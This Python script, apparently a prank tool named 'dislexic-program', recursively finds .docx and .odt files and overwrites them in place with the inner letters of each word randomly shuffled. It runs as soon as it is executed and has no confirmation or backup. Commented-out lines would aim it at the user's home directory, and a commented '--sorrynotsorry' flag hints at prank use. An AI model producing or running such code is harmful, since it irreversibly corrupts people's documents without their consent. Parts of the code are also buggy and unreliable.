__author__ = 'Joel'
__author__ = 'Mar'
import pydoc
import time
import random
import platform
import os
from zipfile import ZipFile
import xml.etree.ElementTree as ET
import tempfile
import sys
import zipfile
# Se coge la palabra, # se mantiene la primera y la ultima letra y las de en medio se intercambian de forma aleatoria
# El proceso de intercambiado es: se coloca en una posicion aleatoria de las letras y se intercambia de forma aleatoria
# con otra posicion aleatoria si calculando el timestamp con el modulo de la fecha de creacion de linux
# (25 de agosto de 1991 = 25081991), se suman todas las cifras hasta que quede un numero y si ese numero es multiplo
# de los 4 elementos (fuego, tierra, agua, aire, eter) entonces intercambia con otra letra aleatoria de la palabra
linuxCreationTime = 25081991
conditionChange = 7  # elemntos basicos

def updateZip(zipname, filename, data):
    # generate a temp file
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
    os.close(tmpfd)

    # create a temp copy of the archive without filename
    with zipfile.ZipFile(zipname, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
            zout.comment = zin.comment  # preserve the comment
            for item in zin.infolist():
                if item.filename != filename:
                    zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    os.remove(zipname)
    os.rename(tmpname, zipname)

    # now add filename with its new data
    with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)

def calcCondition():
    modulo = int(time.time()) + random.randint(1, 10) % linuxCreationTime
    #print(modulo)
    #numCondition = random.randrange(1, len(str(linuxCreationTime))-4)
    numCondition = 1
    res = 0
    while len(str(modulo)) > numCondition:
        #print('miau2')
        for cifra in str(modulo):
            #print(cifra)
            res += int(cifra)
        modulo = res
        res = 0
    return modulo

def twistWord(word):
    if word == 'Çeşme':
        print('----------------------MEGAMIAU--------------------')
        print(word.encode('utf-8', 'surrogatepass'))
    if len(word) < 3:
        return word
    #print(word)
    twisted = list(word)
    while (calcCondition() % conditionChange) != 0:
        aux1 = random.randrange(1, len(word)-1)
        aux2 = random.randrange(1, len(word)-1)
        aux3 = twisted[aux1]
        twisted[aux1] = twisted[aux2]
        twisted[aux2] = aux3
    finishText = ''
    for elem in twisted:
        try:
            finishText += elem
            #print(''.join(twisted))
        except:
            print(elem)
    return ''.join(twisted)


def twistText(file, sentence=False):
    text = ''
    if not sentence:
        readFile = open(file, 'r')
        text = list(readFile.read())
    else:
        text = file
    newList = list()
    #print(text)
    aux = ''
    cont = 0
    for t in text:
        cont += 1
        if t.isalnum():
            aux += t
        else:
            newList.append(twistWord(aux) if len(aux) > 3 else aux)
            newList.append(t)
            aux = ''
        if cont == len(text):
            newList.append(twistWord(aux) if len(aux) > 3 else aux)
            aux = ''
    #print(''.join(newList))
    if not sentence:
        readFile.close()
        writeFile = open(file, 'w')
        writeFile.write(''.join(newList))
        writeFile.close()
    else:
        return ''.join(newList)


def twistDocx(file, extension='docx'):
    with ZipFile(file) as myzip:
        textFile = ''
        generalEti = 'w:t' if extension == 'docx' else 'text:p'
        document = 'word/document.xml' if extension == 'docx' else 'content.xml'
        dictOcurrences = dict()
        with myzip.open(document) as myfile:
            stringFile = myfile.read().decode('utf-8')
            root = ET.fromstring(stringFile)
            for p in root[0]:
                for r in p:
                    for t in r:
                        print(t.tag)
                        if t.tag == '{http://schemas.openxmlformats.org/wordprocessingml/2006/main}t':
                            etiq = ''
                            if len(t.attrib) != 0:
                                for key in t.attrib.keys():
                                    etiq = '<' + generalEti + '>' if (len(t.attrib) == 0) else '<' + generalEti + ' xml:' + key.split('}')[1] + '="' + t.attrib[key] + '">'
                            dictOcurrences[etiq + t.text + '</' + generalEti + '>'] = etiq + twistText(t.text, True) + '</' + generalEti + '>'
            myfile.close()
        with myzip.open(document) as fileInRaw:
            textFile = fileInRaw.read().decode('utf-8')
            for key in dictOcurrences.keys():
                print(key)
                print(dictOcurrences[key])
                textFile = textFile.replace(key, dictOcurrences[key])
            print(textFile)
            fileInRaw.close()
        myzip.close()
        updateZip(file, document, textFile)


def searchTextFiles():
    OS = platform.system()
    rootDir = '.'
    if OS == 'Windows':
        #os.chdir('USERPROFILE')
        os.chdir('C:\\Users\\Joel\\Proyectos\\dislexic-program')
    elif OS == 'Linux':
        #os.chdir(os.getenv('HOME'))
        pass
    for dirName, subdirList, fileList in os.walk(rootDir):
        #print(dirName)
        for fname in fileList:
            #print(fname)
            finalFile = os.path.join(dirName, fname)
            if fname.split('.')[-1].lower() == 'txti':
                #twistText(finalFile)
                pass
            elif fname.split('.')[-1].lower() == 'docx':
                print('no hay docs')
                print(finalFile)
                twistDocx(finalFile)
            elif fname.split('.')[-1].lower() == 'odt':
                print(finalFile)
                twistDocx(finalFile, 'odt')

# for arg in sys.argv:
#     if arg == '-h' or '--help':
#         print('Usage {}')
#     elif arg == '--sorrynotsorry' or '-sns':
#         print('')
#     elif arg == '-home':
#         pass

searchTextFiles()
